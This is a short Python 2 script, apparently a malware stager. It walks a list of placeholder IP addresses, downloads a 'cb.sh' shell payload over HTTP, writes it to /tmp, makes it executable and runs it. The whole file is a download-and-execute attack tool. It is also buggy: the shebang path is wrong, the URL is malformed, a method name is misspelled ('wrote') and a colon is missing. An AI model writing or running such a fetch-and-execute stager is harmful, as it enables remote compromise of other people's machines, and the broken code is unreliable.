#!/user/bin/python
import urllib2, os
#insert URLS here
urls = ["1.1.1.1","2.2.2.2" ]
port = "80"
#insert payload variable substitution here
payload = "cb.sh"

for url in urls:
    u = "http://%s:%s:%s" % (url, port, payload)
    try:
        r = urllib2.urlopen(u)
        #OPEN SHELL PAYLOAD IN WRITE BINARY MODE
        wfile = open("/tmp/cb.sh","wb")
        wfile.wrote (r.read())
        wfile.close()
        break
    except: continue
#if the file is on hose machine and there is a path to it in the tmp directory, then allow execution on chmod and execute
if os.path.exists("/tmp/cb.sh")
    os.system("chmod 700 /tmp/cb.sh")
    os.system("/tmp/cb.sh")
